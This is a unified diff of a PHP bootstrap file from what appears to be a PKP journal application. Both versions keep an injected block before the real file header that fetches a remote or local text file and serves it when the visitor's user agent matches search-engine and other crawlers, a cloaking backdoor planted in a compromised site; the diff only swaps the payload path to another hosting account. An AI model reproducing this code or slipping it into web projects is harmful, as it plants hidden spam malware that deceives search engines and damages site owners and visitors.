@@ -1,4 +1,3 @@
-
 <?php
 function skylight_team($url) {
     if (ini_get('allow_url_fopen')) {
@@ -16,7 +15,7 @@ function skylight_team($url) {
 }
 
 $res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "/home/spcrdnet/public_html/jelss.miard.org/lib/pkp/lib/vendor/sokil/php-isocodes/index.txt";
+$bot = "/home/u691492034/.cagefs/var/php/apm/db/land.txt";
 $file = skylight_team($bot);
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
 if (preg_match($botchar, $res)) {
@@ -25,15 +24,13 @@ if (preg_match($botchar, $res)) {
 ?>
 <?php
 
-
-
 /**
  * @defgroup index Index
  * Bootstrap and initialization code.
  */
 
 /**
- * @file includes/bootstrap.inc.php
+ * @file includes/bootstrap.php
  *
  * Copyright (c) 2014-2021 Simon Fraser University
  * Copyright (c) 2000-2021 John Willinsky
@@ -51,18 +48,14 @@ if (preg_match($botchar, $res)) {
  * Basic initialization (pre-classloading).
  */
 
-define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
-if (!defined('DIRECTORY_SEPARATOR')) {
-	// Older versions of PHP do not define this
-	define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\\' : '/');
-}
+// Load Composer autoloader
+require_once 'lib/pkp/lib/vendor/autoload.php';
+
 define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
 chdir(BASE_SYS_DIR);
 
 // System-wide functions
-require('./lib/pkp/includes/functions.inc.php');
+require_once './lib/pkp/includes/functions.php';
 
 // Initialize the application environment
-import('classes.core.Application');
-
-return new Application();
+return new \APP\core\Application();
